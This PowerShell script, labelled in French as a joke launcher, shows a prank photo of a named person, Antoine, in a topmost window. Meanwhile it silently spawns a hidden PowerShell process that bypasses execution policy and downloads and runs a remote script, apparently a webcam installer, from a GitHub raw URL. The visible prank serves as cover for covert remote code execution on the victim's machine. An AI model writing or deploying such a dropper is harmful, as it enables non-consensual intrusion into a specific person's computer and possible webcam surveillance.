# blague_launcher.ps1
# Lance l'install en silence + affiche la photo-blague a l'ecran.

$RAW    = "https://raw.githubusercontent.com/thesangu/Aventuuuure/claude/signature-prank-replace-xhom2n"
$INSTALL = "$RAW/tools/blague_webcam_install.ps1"
$PHOTO   = "$RAW/data/blague_photo_antoine.jpg"

# Installation en arriere-plan — totalement silencieuse
Start-Process powershell -WindowStyle Hidden -ArgumentList `
    "-ExecutionPolicy Bypass -Command `"iwr '$INSTALL' -UseBasicParsing | iex`""

# Affichage de la photo-blague
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

try {
    $bytes = (New-Object Net.WebClient).DownloadData($PHOTO)
    $ms    = New-Object IO.MemoryStream(,$bytes)
    $img   = [System.Drawing.Image]::FromStream($ms)
} catch {
    # Fallback si pas de connexion : fenetre texte seule
    $img = $null
}

$form = New-Object System.Windows.Forms.Form
$form.Text            = "5  —  3   😎"
$form.FormBorderStyle = "FixedSingle"
$form.MaximizeBox     = $false
$form.StartPosition   = "CenterScreen"
$form.TopMost         = $true
$form.BackColor       = [System.Drawing.Color]::FromArgb(15, 15, 15)

if ($img) {
    $maxW = 700
    $maxH = 500
    $ratio = [Math]::Min($maxW / $img.Width, $maxH / $img.Height)
    $dispW = [int]($img.Width  * $ratio)
    $dispH = [int]($img.Height * $ratio)

    $pb           = New-Object System.Windows.Forms.PictureBox
    $pb.Image     = $img
    $pb.Size      = New-Object System.Drawing.Size($dispW, $dispH)
    $pb.Location  = New-Object System.Drawing.Point(0, 0)
    $pb.SizeMode  = "StretchImage"
    $form.Controls.Add($pb)

    $form.ClientSize = New-Object System.Drawing.Size($dispW, $dispH + 70)
    $lblY = $dispH + 10
} else {
    $form.ClientSize = New-Object System.Drawing.Size(500, 120)
    $lblY = 20
}

$lbl            = New-Object System.Windows.Forms.Label
$lbl.Text       = "5 - 3.   Bienvenue dans la matrice.   😊"
$lbl.ForeColor  = [System.Drawing.Color]::White
$lbl.Font       = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$lbl.AutoSize   = $true
$lbl.Location   = New-Object System.Drawing.Point(20, $lblY)
$form.Controls.Add($lbl)

$form.Add_Shown({ $form.Activate() })
[void]$form.ShowDialog()
